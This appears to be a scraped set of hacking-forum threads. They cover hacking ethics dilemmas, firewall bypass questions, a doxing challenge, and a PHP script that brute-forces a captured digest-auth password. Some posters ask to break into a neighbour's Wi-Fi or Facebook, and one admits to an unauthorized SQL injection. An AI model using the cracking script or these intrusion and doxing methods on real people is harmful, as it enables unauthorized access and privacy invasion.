day, on your favorite site, you find a possible security risk. after some testing, you realize that it is so big  and obvious, a skiddie could get into it without tools. you know its your rightful duty to report this so they can get it patched as soon as possibly, but, your curiosity gets the best of you. you decide to invade their privacy a bit, and get access to their box through several different exploits. once on the box, you decide to do a bit moar snooping. you find hundreds of files depicting how this company has been cheating its customers, and working with mexican cartels. you also find evidence on how they treat their employees like 4chan treats fat chicks. if you report this, youll get busted for hacking, and the company could most likely counter-sue your ass off your chair. if you dont, this will continue to happen, the company will continue to feed the ever violent cartels, and some skiddie could find the security hole and take down the website, if not the company. wat do? 3. the contact: while fapping to your favorite pron on teh interwebz one day, you realize you have a new email in your inbox. upon further investigation, you see its a message from the all  powerful  skiddish, anonymous. theyve seen your bountiful knowledge on this site, and have seen some of your less legal work else where. they want you in. theyre willing to pay you 100,000 $ to take down this corrupt companys website, and servers. essentially, to deban everything connected to the internet in their possession. you say, hey, i need the money. the wife (or husband) and i desperately need the cash for college, and got a little one on its way.. so, you go to the website, find an easy-peasy vulnerability, beast the fuck out of it, and are in. once youre in, you realize that anonymous was completely lying to you and that this company has done nothing wrong. in-fact, its donating 70% of its profit (appx. $200,876 (after payroll, and bills of course)) to help starving children in africa. it seems that the people who contacted you had an idiotic personal issue with the creators of this site. but, if you dont screw with it, you wont be able to pay rent, food, college tuition, and you have a baby on the way. youll also piss off skiddies with a botnet. but, if you do, then the starving children in africa will start starving again, and you could go to jail for hacking, and never see your newborn. wat do? while these are amazingly extreme situations, its always fun to see responses to catch 22s like these. game on hts.
3	TO BE OR NOT TO BE?	"first of all i would like to make you think more about who you are, why you are, where you are, what you want and where you are going. so if you dont like to spend much time thinking about life and rather spend more time taking drugs and party every day? then i suggest for you not to comment at all to spare yourself from humiliation. as for the rest of you guys that are interested in knowing more about life i want to consider few things below:       philosophy + ( science  vs. -   religion ) + life with god #1 philosophy:  many think that science is the way forward to become enlightened. yet life at first was thought to be simple by such as to all known mr. darwin. but science alone isnt enough to achieve enlightenment thats where philosophy comes in such as ""simplicity is the ultimate sophistication"". later we find it to be true. of course there seems to be contradiction in this statement, but no more than religious so called ""contradictions"" or even ""scientific"". so let philosophy be our missing link of both right and wrong (for now). and the only way to find the right one is actually to find out where we are now and where we are heading. there are many philosophies in life. most of them are based on experience. but experience is like knowing both good and evil, right and wrong. people make mistakes. people change and finally many people define their lives by one-sided experience while others by two-sided. those that seek the truth, find it. because ""you can run from the truth, but you cant hide from it. eventually you will run into it as it is as light guiding this world."" - vadim cool     #2 science:  let us go back to darwin since every atheist is praising darwin. darwin supported the theory of natural selection along with that life must be very simple. well simplicity is true to the extend that it is the ultimate sophistication proven even by later science, not to mention philosophy. just like we now have macro-evolution theory standing butt naked to micro-evolution theory where natural selection getting its butt kicked by the day since there are more evidence to support (note: devolving) evolution rather than evolving evolution where we find bigger species and humans of intellect throughout history of their own significant complexity. my personal favorite is the one i find least mentioned on the internet is sex. well everyone loves sex right? so why is nobody talking about it when it comes to science vs. religion? its funny for me to see how natural selection is promoted as the way forward, yet nobody takes a look around to see the probability of it being the way backwards. natural selection is about the survival of the fittest. but there is only a need for 1 fittest cell like a virus in order to maintain its significance and adoption to the natures course of evolution. yet everywhere around us we life still prospering not to mention that especially in animal species we see a requirement of a female and male organs in order to reproduce and survive. so if one is dead without the other, then it is a weakness which should have been removed long time ago by so called natural selection polishing process. while people may call this development for natural selection. in reality its just a name which many dont know the real meaning of, since many dont know what nature even is. if nature perform things in a certain pattern, its indeed not an election of the fittest, but rather a selection by a design. since nature isnt suppose to have a mind of its own, then why does it look so pre-programmed? like a product that never fails to impress and to re-sell due to its changes that are almost never flawed. no matter how deep we dig, we do not find mutants, but rather impressive creatures that are more beautiful than (ferrari designed by man). were then no longer talking about a natural selection, but rather a supernatural selection beyond our control which is far more likely in our case and if we ever to have any hope for a future. besides there is far more to life than pure science, like love, beauty and life after death which could occur in other dimensions which cant be measured by scientific instruments... and how can something come from nothing anyway?.. no-one dare is foolish enough to challenge theory of non-existence since we consider yourself to exist. so science alone can kick it off so that no religion cant stand in its way? there is just one problem or two. number one is that science is can only measure depth of creation while creation in it-self doesnt provide life, but rather replicates it, a process which even scientists havent achieved yet like to make a human being from scratch, so what does it say about our human intellect when nature can achieve more than us? are we then to give more value to a cell than our intellect/thoughts/soul? and besides there is a reason people call programmers nerds with no life. because there is more to life than a string of code. values which we live by such as love. so when i die, what am i going to use my scientific knowledge for in death? or if i were to live forever on earth or in space around people with lust for blood and power, how is that different from living forever with god which is considered to be evil by many atheists? at this point i stand better chance with god. since at least if god is god, he must be stronger, smarter and more powerful to make my life awesome! and if it was to make my life miserable or hell, then why am i experiencing so many good things in life besides the bad things? so next stop, religion. #3 religion:  many believe in god or so they say, yet almost everyone seems to have their own personal god which is god of no personality or a god with a personality but not answering god or an answering god but claims to be different god since everyone experiencing different answers. but is it really that complicated? yes and no. some believe that there is a spiritual world or different dimensions. yet their experience may indeed be false. because spiritual world can contain, not different gods, but rather spirits claiming to be gods. there can be only one god and therefore people shouldnt seek spirit world, but rather god. but you will be surprised if you go on google and see for yourself that it is far easier to come in contact with spirits rather than god itself. why? now that is a good question and something for you to figure out. a hint would be, ""god want us to realize that on our own we can only do evil and destroy ourselves"". in any case you should seek god like if it was your last day of life, because you never know when your last day actually will come. and if i were you, i wouldnt bet my life on a complete random chance and place it on a russian roulette. if we know love, lets start with that. then so must also god. and if we live only for ourselves, so does ... no! we dont live only for ourselves, at least not like me, myself and i. we live for eachother/ourselves. and so now we can say that so does god. god lives to make our life a joy and not a living hell. and the only reason our lives become a living hell sometimes is because sometimes we get too greedy and spoiled wanting things we dont really need. like a big house rather than a happy child. a spoiled child rather than a good child. people living for eachother not realizing that their lives are temporally and that they soon going to leave this kind of life. still many go on doing as they pleased without considering the cost of leaving faith to god who might be very angry and displeased. because our lifestyle and in total our value of life isnt found in life but rather in death since many of us are looking forward to death without any concern for what next? but this isnt a game where you can go on to next game after you done your best with this one. this is your now which will decide your future. and your children and your children-children wont decide your future. you will. but what if there is only one possible god and your will does not correspond with gods will? are you free to do as you pleased and still be right? sure.. you will always be right if you want to be god and play his part. but then be willing to spend the rest of your possible future in the absence of god on your own. and since god only want the best for us since god must know far more to love than us his creation. and we never seek god and never want to find a life with god? then our life will be hell in one way or another. because humans fight eachother far more and kill far more of its own kind than any animals on earth probably even combined all together. good luck surviving. it seems more intellect we gain, the faster we are able to destroy ourselves. as for the experience with god.  i can promise you, you will have it for real so there wont be any doubt in your mind that it was god. but only if you wish for an actual life and not just a hopelessness to look forward to. every story is different, some indeed experience more and some experience less. but one thing remains, the experience which point to the same source. that source is jesus. there is a reason for why people still use b.c. and a.d. in our date. things changed when christ has walked the earth. those things he taught can be performed and even tested for those who refuse to believe. but the awesome thing is, why wait for someone else to reveal god to you when its you that need to experience god, not me. god is alive and we can see it by what we experience when we walk according to the teachings of jesus christ. you can experience them as well. the question is do you want to and what will you do after that? yes, god want us to be happy, but god also want us to live by his side and not somewhere far away like if we were fugitives or somethings. there is no need to and not recomended since we will just create our own hell for ourselves and it is a declaration of war to good god (our creator) at the same time. so will you live for god if you experience god? that my friend would be a nice consideration before you start your conversation with god. because god is using those that are willing to live for him and with him, not to die for him/(our life giver and our true father). dying is easy, living is hard. just like your father and mother gave you life, wouldnt you live close to them? well in any case.. love is not about separation. so if you want love, you will go and seek your true life giver and he will answer the door if you come to make peace and not war. so to be or not to be a believer, good, alive and loved? one thing that you may not always understand gods intentions. another is they will eventually bring you or people around you true joy of life which you cant experience on your own or even with people. only with a righteous and loving god. i will also be happy to answer any questions, provide you with videos, links and even meet you in person if needed."
1	Java: MATH.random exploit	im new to java and object oriented programming in general, so i may have bitten off a bit more than i can chew with my current project. i was wondering what you all knew about the math.random method. im assuming it uses a seed, but i cant find the approximate length of the seeds, or any other details that might be vaguely helpful really. basically, the program im working on simulates a dice roll using math.random, but id like to hack my program and see if im able to predict the outcome of the dice roll before it happens. ultimately, im wondering what security flaws are presented specifically by using math.random to generate my rolls. if you have any insights or can direct me to any information that might be useful, id really appreciate the help.
1	dealing with the uni network	hey guys,   first of all i want to apologize if i am posting in a wrong section. i couldnt find anything specifically related to anonymity. so recently i moved in to the university. there is one problem that i am having though. the network has very restrictive rules - i am not 100% sure, but based on what i tried, the firewall blocks almost all the traffic except internet (port 80) - so no ftp, rdp, vpn, proxies. of course many of the websites are blocked too, as well as torrenting (obviously). what i am trying to do is bypass this sh*t and maintain my privacy (as much as possible).   there are several ways i could go about this - vpn, ssh tunnel or tor is what i was thinking. from these three i tried vpn which is blocked apparently. i am not sure if id be able to configure tor to route all my traffic (not only internet browsing) through its nodes. i think ssh tunnel would be optimal, as long as i could configure it through port 443 (which should be open in the uni firewall).  i would need to connect to a vps (or any remote machine) - windows, for convenience. but i am not sure about this whole procedure. ive never actually configured a ssh tunnel.    could you give me any suggestion/tips? what would you do in this case? thanks

1	Avoiding schools proxy? Please Help.	at school, they have a proxy login for each user, a username and a password. i have been trying to find ways around this problem, but i cant. i have heard that you can set up a private network, or something, and access all sites that way, including torrenting. i have tried to set a proxy by following several tutorials, etc. and this is all i have come up with:  http://private-web-proxy.appspot.com/ . i really dont know anything about what i am doing. ive heard someone at school has set up a vpn and is able to do anything, i obviously have no idea how to do it, but he wont tell anyone how to do it. please pm.
3	The Art of Exploiting SQL Injection: 1 day hands on training	"hello all, this year at black hat las vegas, i will be hosting a 1 day training course on the most popular web app hacking technique sql injection. video preview:  http://www.youtube.com/watch?v=6pg-lrv8xtq here is the abstract of the course: ""this is a full day hands on training course which will typically target penetration testers, security auditors/administrators and web developers to learn advanced exploitation techniques. sql injection, although now nearly 15 years old, still exists in over 30% of the web applications. this vulnerability could typically result in 3 scenarios: authentication bypass extraction of arbitrary sensitive data from the database access and compromise of the internal network. this training will target 3 databases: ms-sql mysql oracle and discuss a variety of exploitation techniques to exploit each scenario. the aim of the training course is to address the following: understand the problem of sql injection learn a variety of advanced exploitation techniques which hackers use learn how to fix the problem identify, extract, escalate, execute; we have got it all covered. more details can be found here: https://www.blackhat.com/html/bh-us-12/training/courses/bh-us-12-training_exploiting-sql-injection.html there are a few seats still left and the course will sell-out very soon. if you require more details feel free to contact me at sid-at-notsosecure-dot-com thanks sid"

1	wpa-psk 2	hey there i was wondering im trying to hack my mates internet. who lives up stairs and i was wondering if anyone could help me with hacking it? i know its a wpa-psk 2 security key and that i can bet money on it its still the default one off the telecom modem..  anyone help a complete noob to hacking?
3	Laptop or desktop...	"this problem has bothered me for while now but first of all little background which has lead to this: i have a few years old laptop, 15""/3gb ram/dual core 2.16ghz/basic videocard, which is still runing quite smoothly windows 7 except when im using external monitor: the image is not clear with hd resolution so i have to use 1440x900 which is kind of annoying cos i bough a new monitor resently when i noticed that one monitor is not enought and i would love to use its full potential. secondly i cant use both my monitors and the video output is vga. then my old desktop is reach its end (64bit amd 3500+/2gb ram/ati radeon 850 pro [but i already found a buyer for it]).  so i have two 24"" monitors + i dont play games by my computers but the new computer has to have enough power to light weight photo manipulation, (to run virtual linux system if it will be my only computer) and have multiple tasks as runing at same time... (default situation is that i have eclipse, couple browsers, spotify, chats, few explorers, older photoshop and few other windows open at the same time) okey, then. the problem is that now i have to buy a new computer and i have been bouncing betweed a new laptop or a desktop. so the guestion is in two parts. if i buy a new laptop how can i get both monitors in use? does it need some docking station that has dual dvi port and if so which manufacture you guys suggest/recommend? i did a little browsing and found out that only few ones has docking station support... the second part is that i have been thinking if i also sell my current laptop and only have this one laptop with docking stations... i know its bit risky choice but does anyone has experience from that type of situation? is it enought...? normally i run my computer 24/7 and reboot it once in month   still, these decisions are hard   one choise defines my next 3-4 years...  the desktop has its benefits: great upgrading abilities, cheaper... also the laptop has its own: compact, all-in-one, easy to take it with you... when i have two computers its always balancing betweed them... another has always it what you will need into the other....  like you can see... i cant make these type of decisions: please help me clear my mind..."

2	dislosing a vunerability	"about a week ago, i rang up a company because their web site had obviously been hacked. i went back yesterday and they had fixed it up. i noticed a few things like directory listing of obviously content that should not be publicly available and then i stumbled upon a hidden ""admin logon page"". having just completed realistic 2 and having a user name i could not resist in trying the sql injection hack. im in and it presented me with lots of nice tools to add and remove content to their site    . i cant anonymously call this time because the technical detail is too high for the receptionist. is the best bet to send them snail mail or should i just move on and forget about it? it is not an ecommerce site, but they would have enermies who would like to deface their website. it is not a political website - they just do necessary things that the public generally dont like."
1	Facebook hacking	hello guys im new but im a good: i want to learn to hack anything, but i just use good . i like so i just wanted to because i can help others to be able to hack the account they would teach me because i just want to get my account was that hack friends ivel that he hacked my account before but he no held
3	Green as grass.	hey guys, so i’m about as green as green gets with this world. (html, java, networking, etc.) so take er’ easy on me.                   i guess a little history as to why i am here now would be appropriate so; i’m 19 now (yes i’m arriving to this party a little late) but i’ve always been fascinated with computers and most things to do with them. so it’s no surprise (at least to me) that i’m here today. but as its apparent i am looking to get into learning coding, networking, hacking and what-have you. i’ve made extremely simple drafts of web pages with html before, although long enough ago that i have no sense of what’s up from down. in the last week or so i’ve been meandering around the internet with a real conviction to learn the ups and down with hacking. and before we go any farther, i am interested in both sides of hacking, whether it be white-hat or black. it interests me. black-hat hacking interests me in not the maliciousness but the methods and processes some people come up with to overcome crazy security and “stick it to the man”. so don’t worry, you’re not going to see me as the next face getting arrested for attacking some credit card company. (i’m to paranoid for that kind of thing lmao)                   as it has been posted numerous times before me, “where tha hell do i start?” don’t get me wrong, i have a lot of the threads here to see if i could answer my own questions. but i still feel i have many more, and probably will continue to have questions for a long damn time.   i’ve dabbled through the html guides online and i still have a lot more to learn. i guess ill just jot down a list of what i’m interested in and whoever can help me out it would be greatly appreciated!   -          what languages do i need to learn to get started? (html, java, etc) -          am i better off sticking with windows, since i’ve used it forever. or should i dive into linux? or even a mac (i used to have one) -          networking, lots of networking. (if that makes sense)   this is more going to be a hobby of mine, so i’m in no rush to learn everything asap. although i’d love to quickly become a ninja with computers. and if i actually become proficient with this stuff i’d like to work in a field of work that is compatible with this knowledge… one step at a time.   i’m also not shy of dishing out some money for this new hobby of mine, so i’m asking what kind of computer would be sufficient for this kinda thing (i don’t want to be replacing it anytime soon) my price limit is 2000$ and i’m partial to a laptop. should i be looking into linux for a new system?   and i like privacy, i downloaded tor and its pretty cool. “google deutschland” makes me chuckle every time. so any other programs like that are pretty interesting to me.     *after reading all this, my thoughts are kinda jumbled up, so if theres anything that doesn’t make any sense ask me and ill get it cleared up!   cheers,
3	CSRF blocked	well, i was doing the ext. basic missions and decided to move on from the one i was doing as i couldnt figure it out afer a while and when i did firefox said it couldnt load page as it had expired and then i clicked reload. it took me to the mission i had just completed, and below the mission code for ext basic 3 it said csrf blocked. now i read up on it and its cross site request forgery, did someone try doing something to me or is it just because i reloaded the page because i expired? sorry. i decided to repeat what i did and its because i reloaded the page.
3	Some feedback on site usability...	i used to be active on hts many years ago. i actually learned a lot about computers/programming since then, and decided to come back to dick around with the challenges. anyway, seems like things are a bit dead around here. the irc channels even used to be extremely active. i know this isnt solicited advice, but just some thoughts: 1) the text is hard to read. i have 20/20 vision and doing some of these challenges, between the stark contrast of black/white/grey and small text size, i had to copy and paste to a notepad document to read some of it a great example:  https://www.hackthissite.org/missions/r ... index.html 2) navigating missions is awfully hard. when i complete a mission i then end up back at a page where i have to scroll through to find the next mission. i know it used to be like this, but there seem to be a bit more missions now. 3) registration - a 15 character password required? i know thats good password length, but lets be honest, i have a hard enough time remembering all of my passwords let alone an extra 15 characters one. 4) login: forgot my username i regsitered with, and entered the wrong one before i got it right. after one failed login a captcha was required. this seems a bit excessive.... i hope you dont dismiss my post as non-sense but, im trying to help
1	"What comes after ""Getting started""?"	"my understanding of hacking is that its a way of interacting with a system(network, web, etc) in ways the maker of the system did not intend. like bypassing the interface they want you to use, and using your knowledge of such systems to get more functionality out of it than they want. id like to advance my knowledge further but i dont know what to look into specifically. im already conversant with scripting languages (html, javascript, php, etc). for instance, i have burp. i know how to spider and then scan a website(carefully) or even just passively scanning it by manually going through the web application. itll come up with a list of vulnerabilities. i know what they mean and if i dont it explains it. however, i dont know what to do with them. this sites missions are helpful, because to complete a mission you have to exploit different vulnerabilities and when i figure out how to complete it i always study up on the details of how and why. so, ive learned about injections, xss, cookies, hash values, etc. however, it seems to me like these things are only a couple drops in a very large bucket. that most web applications except amateur ones would be protected against them. so, what im asking is this. if i know the programming well enough, and my end goal was pentesting or trying to gain admin access to a website(or something along those lines) where should i direct my focus. injections, xss, etc are the tools i have now, what other ""tools""(techniques?) are there?"

3	Am I cheating myself?	hey i have managed 4 of the programming missions on here, my problem is that on some of the challenges (most notably number 2) i didnt write a single program to solve the challenge. what i did was make some smaller programs that were linked together with a bash script. to illustrate: grab image in chrome <bash script starts here> imagemagick to convert to raw small java program to output a text file containing hex values of each pixel sed to clean up the text file pass text file to another small java program to get password. now, my problem, is this still in the spirit of the challenges or is this showing holes in my programming ability? sure i could do some google-fu for a few hours and find out how to do it in a single java file but the way i did it is what instantly came to me when thinking it through on paper. thoughts?

1	I Lost My Windows 7 password	"hi guys, do you agree that  time could dilute the memory, but you cant make people forget his memory? get to the point, i had ever  lost windows 7 password and that matter confused me for a long time. it is a very terrible experience, which influenced my work and life for two weeks. i lost my head and almost smashed my acer aspire computer during that period. for many times i asked myself, why did i    *link removed*  lost my password for windows 7[/url] ? why did i make my life in a less?  it doesnt make any diffference! god works! my parents comforted me like that words more than once. however i didnt out of my dilemma and blamed myself again and again, it is my fault! it must be my fault! why did i lost my password for windows 7? why did i be so stupid to lost windows 7 password? during that time i had no direction, i just got wherever the wind blows. i was concerned about the project martirals of my company. the project was around the conner and the most terrible situation was that all the materials i prepared was in the computer and i   lost my windows 7 password   so that i couldnt login into my acer aspire laptop!  i couldnt help crying aloud for thirty minutes in the small hours of one mornning. at the same time my parents came to me and told me that i distubed my family and neighbour just now. ""calm down, poor guy! you only lost windows 7 password. it is not the end of the world! come on and find out the solution. we are always by your side. lets do it together! "" my father said, with his encouraging eyes. ""thank you, dad."" i replied. the next day we borrowed a workable computer from our neighbood and began to search on the internet about  lost acer windows 7 password  for the whole day. at last , we got the answer from an article of windows password recovery tool website. that is great! thank god!"

3	I cant enter basic mission	i registered to this site 3 hours ago, and, i have been trying to enter mission 1 since the last 2. i keep getting that my password is invalidm wich it isnt. i even tried logging out and in, and the password was just fine. what can be the problem?
3	Limdis Doxing Mission --CHALLENGE DOWN--	ok so the last portion of the challenge has been destroyed due to a particular website being taken down. that means the mission is down until further notice... sucks i know. but im going to have to create new content and change links in order to get this back up. -------------------------------------------------------------------------------------------------------------------------------------------- from: anonymous hts staff, i am a freelance private investigator and i represent a client who was recently a victim of identity theft. being that i specialize in physical investigations i would like to ask if you could assist me in tracking this individual down from the digital side. hts has a reputation for taking great care in keeping things quiet and entirely anonymous. my client wishes to handle this situation in their own way so this will not come back to the site. my research on this matter has led me to believe that the hacker may be a member here, though according to his profile he has not been active in some time. i would like to ask if you could pass this username to some of your trusted and skilled members to see if anything comes up that might assist me in tracking this individual down. thank you in advance for your support. alright hts let’s help this guy out. you know the drill; usernames, emails, hometown, real name, birthday, phone number, pictures, and any other juicy information. target: 1amtinytim verify if this individual is involved in anyway. follow any lead. but stay quiet. we are not to get directly involved. do not contact this person! we are to only collect data and pass it off the pi. remember, id thieves can be tricky. don’t believe what you first see. he has likely planted false information to protect himself. finally, see if the stolen information can be recovered. good luck! -------------------------------------------------------------------------------------------------------------------------------------------- this mission is designed to teach some basic doxing techniques and to show just how easy (and some cases quickly) someone can collect information on you. once you know what can be found, you will learn how to keep that information private. to which i encourage everyone to dox themselves after completing the mission to see just what kind of fingerprint you have. you will not need to se for this mission.  you will get to hack into one location, and it will be obvious what that will be once you get there.  please do not hack into any of the accounts found; as it is not needed for this mission and will lead to a dead end anyway. additionally, if i lose control i won’t be able to make updates/fixes. don’t ruin it for everyone else. finally, if you made a mistake in your search the account you are hacking might not belong to me. also, because i cannot control what other websites do if at any time an issue arises that may prevent completion, pm me and i will make fixes. i will be sure to inform everyone if any significant updates happen.  do not download anything! as i have not set up the mission to require any direct downloads. upon completion of the mission you will find a personal congratulatory message from me and be able to list your hts nick for credit. this will also be the discussion thread for the time being. please don’t post spoilers but feel free to ask questions and assist others. enjoy. i have left a lot of room to expand this challenge to integrate more advanced techniques in the future and i would absolutely love to do so if you guys/gals like it and want it to continue. required: - google - email address - extreme attention to detail (take notes). go slow. - treat this like a real life scenario. protect yourself. you may need to create dummy accounts. no idea what doxing is? see here: https://www.hackthissite.org/articles/read/1107/ users completed: centip3de shade_of_gray tomvercetti813 mshred fashizzlepop debus7 darkdexter last update: 11/09/2012 - fixed spam filter preventing completion (again), adjustments to mission text, altered chat log, various small items throughout mission

1	Car Hacking	"car hacking - potentially one of the biggest cyber security threats in the near future? since the beginning of the 21st century, computerization has dominated humanity in almost every aspect of life. everything from mobile phones to cars and homes have become computerized for ""convenience"". not only are these elements computerized, they are also connected through cellular networking... which is what poses the risk. any computerized device can be hacked through what ever network it is connected to and be used in a dangerous manner. anyone who is connected to your car (or house, if computerized) can listen to you, track and even hijack the controls causing an accident (with a house, the hacker could fill the water heater up with some type of gas... i dont need to explain the rest). t his thread is dedicated to the discussion of car hacking."

1	Backtrack 4 and virtual machine problem	"i have googled everywhere and only find articles about installing bt4 on a vm with windows, i need to know how to install virtual machine on bt4 to run windows as a vm within  bt4. i know it is based on ubuntu and need to install dkms, because that is the error i get when trying to run the windows vm within bt4. i did a ""apt-get install dkms"" because i read a article about installing machine machine on ubuntu and others having that error but when i do that command on bt4 is says  ""reading package lists... done building dependency tree reading state information... done some packages could not be installed. this may mean that you have requested an impossible situation or if you are using the unstable distribution that some required packages have not yet been created or been moved out of incoming. since you only requested a single operation it is extremely likely that the package is simply not installable and a bug report against that package should be filed. the following information may help to resolve the situation: the following packages have unmet dependencies:   dkms: depends: linux-headers but it is not installable e: broken packages"" has anyone used virtual box on bt4? how did you get it too work? thanks"

1	Help with Javascript Re-Direction	"ok heres the problem that im having i have a website that our organization uses and they want us to cast our votes on a poll. what id like to do is view the results at the same time of voting. now they use a javascript button to submit your info so if you try to open a new tab in firefox you just get a ""javascript void"" blank window. so i figured that if i opened the webpage in two firefox windows that i could press submit on one window so i could view the results and then the other window i could vote. when i try that i get a website error message that says ""only one instance is aloud to be running of this website."" is there a way to either a) have the javascript execute in a new window/tab so im still able to see both the results and voting or b) open the website in two instances such as two different windows and spoof it to look like one? thanks in advance!"

1	How to trace a hacker?	i suspect, or rather im pretty sure, that someone controls my computer. i need to find out whos doing that, somehow find him/her. because im unfamiliar with this topic at all, i try to find someone experienced, who would be able to help me with this. id be very grateful for any progress, becoming really hopeless.. besides i would like to say that i can learn new things pretty well and if someone capable is willing to help, i believe that you will not be bothered with idiocy too much.
3	Restraints on Technological Advancement	"i have thought about this for a wile now, so just hear me out.      in this post, when i mean technological advancement, i mean a world based on technology, not saying ours is not; rather saying it could be taken to the extreme. a world similar to something you would see in a movie like tron, although very fantasy like; most people would want/desire a world that is so highly advanced technologically.      we know that one of the biggest restraints to becoming a technologically advanced world is money. people either do not have enough money, or do not want to put money into technology. because of course, other things are more important than technological advancement, such as war on drugs, warfare production, and other silly things. i was being rather sarcastic in my point made above, although it is important, there is an extent to where you can stop and realize you have enough nuclear missiles to destroy what ever the fuck you want and start putting that money towards something useful.     so what are some ways to get around the restraints of not having money? open source projects come to mind. though we have open source projects everywhere, there are no open source projects that are becoming breaking technological advancements. sure there a lot of cool apps and fun things such as software etc, but nothing near as incredible as we would desire imo. along with money however comes jobs, and without jobs, there is no money. so if you look a perfectly advanced technological world, everything would be automated for maximum efficiency. if everything becomes automated, then you have no job, which means no money.     for instance, say the world was so advanced that you got thirsty, opened up your fridge, and it was empty, nothing to drink. well you have this piece of technology on your fridge, where you can type in an address, or maybe even a number of a store, order a drink with the options of how many ounces to purchase. it would then take a credit card/whatever the electronic money system is, and prompt you for payment, you pay for it and it begins to pour out of something that could be like an ice maker on a freezer today, or store it in a container built into the fridge if it is say a gallon or more. walla, you just got a drink from your house without having to leave or think about leaving, because the technology there was automated for maximum efficiency.     however, think if it became like this worldwide, there would be no use for stores to have drinks, and if you are a business that sold only drinks at your local store, you can kiss your store good bye. if everything was automated for maximum efficiency. many jobs would become lost/useless. this is another restraint for such a technologically advanced world. if you cant work, you cant get paid, if you cant get paid, then you cant purchase that drink from your tech savvy fridge.   another factor that i believe plays a toll on this is power. if everyone had such powerful technology at their fingertips, it could either unfold into a beautiful technological world, or it would turn into a chaotic disaster. the reason for this is that with technology, there will always hold some sense of power behind it, whenever it does something great/desirable. in todays world, people such as the cia, feds, the governments, usually have better access to technological devices that help them perform above the average population. this makes it easier for the justice system to pick out a needle in a haystack. if everyone in the world had the same power that the president/ruler of a country had, imagine how it could become a chaotic world very fast.      hackers. i think people are scared to advance civilization purely based on technology, because after all; if someone can make something, someone can break it. nothing is 100% secure, and always know that when someone is smart enough to make something; someone will be smart enough to figure it out, and how to manipulate it, period.    i also believe randomness plays a factor to some extent, as you need some things in the real world to be random. in computers, we can only simulate randomness by giving a changing number, such as calling a function to the time of your clock and send it into a mathematical algorithm to make the number seem random, although it is in fact not. to think about it though, in the real world nothing is random, as the future will happen, regardless of what you do now, it was bound to happen and will. even if you think, ""hey, i am going to do this!"", then you think about it and tell yourself ""no, that is probably a bad idea."" and feel like you changed your future, you didnt. because your fate of the future was to do that regardless. a little weird, but if you think about, maybe it will make sense.   you also have the people that are scared to change. some people do not like technology, hate it, its against their morals/beliefs. these people want nothing to do with a world that could be purely amazing.   this is just something i thought about, and although we are a very technologically advanced world and are striving to advance, i see restraints as to how far people will allow it to advance."
1	PHP Website Vulnerabilities	hi, im new to this forum and would like to learn as much as i can after my website got hacked and was used for illegal activities. i have a login page on my site that i designed in php and a few weeks ago i was notified that my website had been hacked and the permissions of my files on my server had all been changed. (not sure if that was done through php or not...) heres my question...what steps should i take in protecting my website from further hackings. i recently changed my login script, added encryption, max length, remove unwanted characters, etc.  is there a chance this can happen again? and if so how can i prevent it? im new to php so im not sure if it was through my php form or another method. thanks for your help! rametta
0	Digest access authentication password crack?	"hi, thanks for taking the time to read my post. i performed a packet capture to discover that one of my devices are communicating with a certain server using digest access authentication. i extracted all the information from the packet capture that i could, and im hoping to be able to crack the password. here is the information i managed to extract: username:	c7y-basic01 realm: c7y-basic noonce: 7abeodcrbaa=e1ad0db74fb39c54879161a7bc8d9276e38482bc uri: /basic_view/func/get_profile nc: 00000001 cnonce: 1f04bb201d972929cd468ccd1c9eb530 response: b7898d100de332566faf2b926ce167b qop: auth and from what i understand, digest authentication works like this (for this particular application): ha1 = md5(username:realm:password) ha2 = md5(digesturi) response = md5(ha1:noonce:noncecount:clientnonce:qop:ha2) it looks to me as i have all the value that i need except for the password, so i figured it would be possible to perform a brute force attack and check the brute response against the real response. ive created a script using php, which im running in a shell currently trying to crack the password, but i have no idea how long the password is, so i dont know if its working until i find the password. so while im spending my days trying to crack this, i figured i should come and ask some hackers who actually know what theyre talking about. so i would highly appreciate it if someone could tell me whether im on the right lines to cracking this password, and if not, what i can do to fix it. thanks for all your help! here is the script im using to try and crack the password (please note, its not all my work, i grabbed a permulation script off the internet to save time). code:  select all <?php permutations(""abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz0123456789"",5);  echo ""password not found.""; function permutations($letters,$num){      $last = str_repeat($letters[0],$num);      while($last != str_repeat(lastchar($letters),$num)){          $last = char_add($letters,$last,$num-1);       checkpwd($last);     }  }  function char_add($digits,$string,$char){      if($string[$char] <> lastchar($digits)){          $string[$char] = $digits[strpos($digits,$string[$char])+1];          return $string;      }else{          $string = changeall($string,$digits[0],$char);          return char_add($digits,$string,$char-1);      }  }  function lastchar($string){      return $string[strlen($string)-1];  }  function changeall($string,$char,$start = 0,$end = 0){      if($end == 0) $end = strlen($string)-1;      for($i=$start;$i<=$end;$i++){          $string[$i] = $char;      }      return $string;  } function checkpwd($password) {    echo ""checking: $password\r"";    $ha1 = md5(""c7y-basic01:c7y-basic:$password"");    $ha2 = md5(""get:/basic_view/func/get_profile"");        $md5 = ""$ha1:7abeodcrbaa=e1ad0db74fb39c54879161a7bc8d9276e38482bc:00000001:1f04bb201d972929cd468ccd1c9eb530:auth:$ha2"";        $response = md5($md5);        $tomatch = ""2b7898d100de332566faf2b926ce167b"";        if ($response == $tomatch) {       echo ""password is: $password"";       exit;    } } ?>"
1	Permissions	hello.  i cant e-mail or pm.  could someone please give me these permissions?  i have some questions, but i cant ask them because the basic 11 topic is locked, i cant pm anyone, and i have a feeling it might upset the mods if i created a new topic.  thanks a lot, folks.  oh, and my question basically was, whats the first thing you do to find the directories?  i know index.php is the password entry page, but thats just something i read in the thread and i wanted to find out how to find it on my own.  also a more general question, how can you hack and change whats on a website?  firebug doesnt save the changes, so is it even possible?  i know it is, but, is it super-complicated or something? thank you! -ep

3	Pushing for open source	intro ==== in case you havent been aware hts is going through a recode process. the absolute bottom line is that the source code for the current production hts has become unmaintainable. this is largely due to the absence of any design or architectural principals applied from the very start of it. another problem with the current hts is that development of it has become a severe point of contention with a very limited staff. to address these problems, we have decided to make the recode open source. this will subject the project to peer review from the very beginning, identifying and eliminating bad design and failures to comply to standards in a far more sane manner. not only will the code be open for public review but it will be open for public patch submission as well. this will allow anyone with a good idea or good eye for spotting bugs and improvements not only to identify them, but to fix them as well. execution ------------ a reasonable chunk of the recode has already been completed. that being said, creating a monolithic public facing repository for the project would be a bit silly. instead we will be segmenting the source tree into logical divisions and releasing them as independent open-source projects. this will allow much simpler integration and development for just about everyone. logical divisions of projects: code:  select all + the framework - (blue elephant)     the framework will be its own independent open-source project which     will aim to be usable for any web application. + the library - (libhts)     the library will consist of a set of libraries that will enable a lot     of the core functionality of hts and also provide a skeleton tool     set for creating challenge 